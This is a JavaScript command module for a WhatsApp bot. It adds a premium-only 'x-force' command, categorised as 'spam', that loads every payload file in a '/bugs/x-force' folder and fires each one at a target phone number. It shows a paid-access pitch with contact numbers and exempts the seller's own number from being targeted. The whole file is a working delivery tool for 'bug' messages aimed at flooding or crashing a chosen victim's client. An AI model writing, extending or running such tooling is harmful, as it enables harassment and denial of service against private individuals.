const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'x-force',
  desc: 'Send all text payloads from /bugs/x-force folder to a target number (Premium only)',
  category: 'spam',
  react: '⚡',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const sender = m.sender.split('@')[0];

    if (!isPremium(sender)) {
      return await bot.sendMessage(from, {
        text: `🚫 *Premium only feature!*

Your access may have expired.
💰 To buy 5-day premium ($5):
📞 wa.me/13058962443 or wa.me/50942241547`
      }, { quoted: mek });
    }

    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'x-force') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}x-force <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs/x-force');
    if (!fs.existsSync(bugsDir)) {
      return await bot.sendMessage(from, { text: '📁 The folder /bugs/x-force does not exist.' }, { quoted: mek });
    }

    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs/x-force.' }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🚀 Sending ${bugFiles.length} payloads to +${targetNumber}`
    }, { quoted: mek });

    for (const file of bugFiles) {
      try {
        const payloadPath = path.join(bugsDir, file);
        let bugPayload = require(payloadPath);

        if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
          await bot.sendMessage(targetJid, { text: bugPayload.default });
        } else if (typeof bugPayload === 'string') {
          await bot.sendMessage(targetJid, { text: bugPayload });
        } else if (typeof bugPayload === 'function') {
          await bugPayload(bot, targetNumber);
        } else {
          await bot.sendMessage(targetJid, { text: `⚠️ Invalid payload format in ${file}` });
        }

      } catch (e) {
        console.error(`❌ Error in ${file}:`, e.message);
        await bot.sendMessage(targetJid, { text: `❌ Error sending ${file}: ${e.message}` });
      }

      await new Promise(res => setTimeout(res, 1000)); // 1 second delay
    }

    await bot.sendMessage(from, {
      text: `✅ Finished sending all payloads to +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
